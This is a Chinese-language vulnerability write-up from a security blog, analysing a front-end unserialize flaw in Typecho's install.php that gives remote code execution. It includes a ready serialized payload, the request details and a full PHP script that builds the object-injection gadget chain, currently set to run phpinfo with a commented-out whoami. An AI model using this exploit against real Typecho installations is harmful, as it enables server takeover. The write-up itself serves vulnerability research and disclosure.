---
title: typecho前台getshell漏洞分析
date: 2017-10-26 10:13:22
tags:
- 反序列化漏洞
- php
---

漏洞是鹿师傅挖的，但是被无意中爆了出来...心疼鹿师傅...

<!--more-->

# 0x01 简述

Typecho[1]是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序[2]，目前使用SVN来做版本管理。

2017年10月13日，知道创宇漏洞情报系统监测到typecho爆出前台代码执行漏洞[3]，知道创宇404团队研究人员成功复现了该漏洞。

经过分析确认，该漏洞可以无限制执行代码，通过这种方式可以导致getshell。

# 0x02 复现

打开安装好的typecho

![image.png-49.7kB][1]

生成对应的payload

![image.png-46.6kB][2]

```
YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
```

设置相应的cookie并发送请求向
```
http://127.0.0.1/install.php?finish
```

![image.png-47.1kB][3]

成功执行phpinfo

# 0x03 漏洞分析

漏洞的入口点在install.php，进入install.php首先经过两个判断

```
//判断是否已经安装
if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
    exit;
}

// 挡掉可能的跨站请求
if (!empty($_GET) || !empty($_POST)) {
    if (empty($_SERVER['HTTP_REFERER'])) {
        exit;
    }

    $parts = parse_url($_SERVER['HTTP_REFERER']);
	if (!empty($parts['port'])) {
        $parts['host'] = "{$parts['host']}:{$parts['port']}";
    }

    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {
        exit;
    }
}
```

只要传入GET参数finish，并设置referer为站内url即可。

跟入代码，找到漏洞点入口点，install.php 232行到237行

![image.png-116.2kB][4]

看起来比较清楚，一个比较明显的反序列化漏洞

问题在于如何利用，反序列化能够利用的点必须要有相应的魔术方法配合。其中比较关键的只有几个。
```
__destruct()
__wakeup()
__toString()
```

其中`__destruct()`是在对象被销毁的时候自动调用，`__Wakeup`在反序列化的时候自动调用，`__toString()`是在调用对象的时候自动调用。

这里如果构造的反序列化是一个数组，其中adapter设置为某个类，就可以触发相应类的`__toString`方法

![image.png-113.6kB][5]

寻找所有的toString方法，我暂时只找到一个可以利用的的类方法。

/var/Typecho/Feed.php 文件223行 

![image.png-223.9kB][6]

顺着分析tostring函数

290行 调用了`$item['author']->screenName`，这是一个当前类的私有变量

![image.png-334kB][7]

358行 同样调用了同样的变量，这里应该也是可以利用的

![image.png-58.5kB][8]

这里要提到一个特殊的魔术方法`__get`，`__get`会在读取不可访问的属性的值的时候调用，我们可以通过设置item来调用某个位置的`__get`魔术方法，让我们接着寻找。


/var/Typecho/Request.php 第269行应该是唯一一个可利用的`__get`方法.

![image.png-76.9kB][9]

跟入get函数

![image.png-230.4kB][10]

最后进入159行 applyFilter函数

![image.png-103.6kB][11]

我们找到了`call_user_func`函数，回溯整个利用链

我们可以通过设置`item['author']`来控制`Typecho_Request`类中的私有变量，这样类中的`_filter`和`_params['screenName']`都可控，`call_user_func`函数变量可控，任意代码执行。

但是当我们按照上面的所有流程构造poc之后，发请求到服务器，却会返回500.

回顾一下代码

在install.php的开始，调用了`ob_start()`

在php.net上关于`ob_start`的解释是这样的。

![image.png-102.5kB][12]

因为我们上面对象注入的代码触发了原本的exception，导致` ob_end_clean()`执行，原本的输出会在缓冲区被清理。

我们必须想一个办法强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。

这里有两个办法。
1、因为`call_user_func`函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。
2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。

解决了这个问题，整个利用ROP链就成立了

# 0x04 poc

```
<?php
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();

    public function __construct()
    {
        // $this->_params['screenName'] = 'whoami';
        $this->_params['screenName'] = -1;
        $this->_filter[0] = 'phpinfo';
    }
}

class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    /** 定义ATOM 1.0类型 */
    const ATOM1 = 'ATOM 1.0';
    /** 定义RSS时间格式 */
    const DATE_RFC822 = 'r';
    /** 定义ATOM时间格式 */
    const DATE_W3CDTF = 'c';
    /** 定义行结束符 */
    const EOL = "\n";
    private $_type;
    private $_items = array();
    public $dateFormat;

    public function __construct()
    {
        $this->_type = self::RSS2;
        $item['link'] = '1';
        $item['title'] = '2';
        $item['date'] = 1507720298;
        $item['author'] = new Typecho_Request();
        $item['category'] = array(new Typecho_Request());
        
        $this->_items[0] = $item;
    }
}

$x = new Typecho_Feed();
$a = array(
    'host' => 'localhost',
    'user' => 'xxxxxx',
    'charset' => 'utf8',
    'port' => '3306',
    'database' => 'typecho',
    'adapter' => $x,
    'prefix' => 'typecho_'
);
echo urlencode(base64_encode(serialize($a)));
?>
```

# 0x05 Reference

- [1] Typecho官网
    http://typecho.org/ 
- [2] Typecho github链接
    https://github.com/typecho/typecho 
- [3] 作者博客
    http://blog.th3s3v3n.xyz/archives/



  [1]: http://static.zybuluo.com/LoRexxar/kblgwfzdgpzo2ssd7j90bjux/image.png
  [2]: http://static.zybuluo.com/LoRexxar/e3qq0u5151r9ttmvfaidwbai/image.png
  [3]: http://static.zybuluo.com/LoRexxar/yhivuba7ugd7d8xo1d4k8tya/image.png
  [4]: http://static.zybuluo.com/LoRexxar/u8e5nrzdma68gz346ln5vpqc/image.png
  [5]: http://static.zybuluo.com/LoRexxar/gz8jnui24d8vul5rngvii8u8/image.png
  [6]: http://static.zybuluo.com/LoRexxar/zv2qqfacbe49qd7yavuf57cg/image.png
  [7]: http://static.zybuluo.com/LoRexxar/bleuuwlrw6fbn2hebsr5g2xc/image.png
  [8]: http://static.zybuluo.com/LoRexxar/d9xg4hq0i175pg2vcnhr3q9y/image.png
  [9]: http://static.zybuluo.com/LoRexxar/u6e2btmbm3ql0ibidzecr1qv/image.png
  [10]: http://static.zybuluo.com/LoRexxar/wubo4hjses1ojqbtdup3j77d/image.png
  [11]: http://static.zybuluo.com/LoRexxar/3knwkkwg7zuoqchqufslraz2/image.png
  [12]: http://static.zybuluo.com/LoRexxar/8e60bdu4yku4xep409s4dgi2/image.png